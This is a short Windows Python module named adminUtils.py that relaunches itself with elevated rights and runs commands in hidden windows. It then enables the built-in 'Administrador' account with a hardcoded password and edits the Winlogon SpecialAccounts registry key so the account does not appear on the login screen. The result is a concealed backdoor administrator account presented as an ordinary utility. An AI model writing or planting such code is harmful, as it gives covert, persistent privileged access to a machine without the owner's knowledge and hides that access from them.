# adminUtils.py
import sys
import os
import subprocess
import winreg
import ctypes

def run_hidden(cmd):
    subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def relaunch_as_admin():
    script = sys.argv[0]
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{script}" {params}', None, 1
    )
    sys.exit()


def activateadminaccount():
    run_hidden('net user Administrador /active:yes')
    run_hidden('net user Administrador mj2145mj')

def hideaccountlogin():
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Administrador", 0, winreg.REG_DWORD, 0)
    winreg.CloseKey(key)
